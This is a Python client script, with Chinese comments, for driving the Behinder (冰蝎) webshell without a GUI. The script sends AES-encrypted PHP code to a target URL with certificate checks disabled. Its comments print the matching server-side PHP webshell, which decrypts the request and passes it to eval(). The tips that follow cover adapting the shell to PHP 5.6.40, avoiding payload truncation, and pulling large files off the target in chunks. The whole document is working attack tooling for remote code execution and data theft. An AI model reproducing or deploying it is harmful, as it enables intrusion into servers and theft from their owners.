#!/usr/bin/env python3
"""冰蝎(Behinder) 无 GUI 自动化客户端 —— AES-128-ECB 变体，适配 PHP 5.6.40。"""
import sys, base64, hashlib, urllib.request, ssl
from Crypto.Cipher import AES

URL, PASS = sys.argv[1], sys.argv[2]
_ctx = ssl.create_default_context(); _ctx.check_hostname=False; _ctx.verify_mode=ssl.CERT_NONE
_ctx.set_ciphers("DEFAULT@SECLEVEL=1")
# ★ 必须显式禁用系统代理，否则 127.0.0.1:7892 会劫持直连
_op = urllib.request.build_opener(urllib.request.ProxyHandler({}),
                                  urllib.request.HTTPSHandler(context=_ctx))

def aes_ecb(key, data, enc=True):
    c = AES.new(key, AES.MODE_ECB)
    if enc:
        pad = 16 - (len(data) % 16)
        return c.encrypt(data + bytes([pad]) * pad)
    return c.decrypt(data)

def run(code, kw="test"):
    key = hashlib.md5(PASS.encode()).hexdigest()[:16].encode()
    body = base64.b64encode(aes_ecb(key, (kw + "|" + code).encode()))
    r = urllib.request.Request(URL, data=body,
                               headers={"User-Agent":"Mozilla/5.0","Connection":"close"})
    raw = _op.open(r, timeout=60).read()
    if raw[:3] == b"ERR": return raw.decode("utf-8","replace")
    try:    return aes_ecb(key, raw, enc=False).decode("utf-8","replace")
    except Exception: return raw.decode("utf-8","replace")

if __name__ == "__main__":
    print(run('echo "PROTO_OK";'))

# 服务端马（519B，已适配）：
# <?php @error_reporting(0); session_start(); $key="<md5(pass)[0:16]>"; $_SESSION['k']=$key;
# session_write_close(); $post=file_get_contents("php://input");
# if(!extension_loaded('openssl')) { ...xor... } else { $post=openssl_decrypt($post,"aes-128-ecb",$key); }
# $arr=explode('|',$post); $func=$arr[0]; $params=$arr[1];
# class C{public function __invoke($p){eval($p."");}} @call_user_func(new C(),$params); ?>

# ★★ 三个必须踩过的坑 ★★
# 1) 标准冰蝎马用 "AES128"，在 PHP 5.6.40 上 openssl_decrypt 直接 failed（AES128 不在
#    openssl_get_cipher_methods()）。必须把服务端 cipher 名改成 "aes-128-ecb"；
#    客户端不变，仍是 AES-128-ECB + md5(pass)[0:16] 作密钥。
# 2) 系统代理（本机 127.0.0.1:7892）会劫持直连 → 所有请求显式禁用代理。
# 3) 明文以 '|' 分字段，**发送的 PHP 代码里禁出现 '|'**（含 || 逻辑或），否则 payload 被截断；
#    需要逻辑或时写 or / AND。
# 4) 读大文件不要靠单次响应（会乱码）：先在目标上 copy() 成 .txt 再用 HTTP 取回，或 6KB 分块 base64。
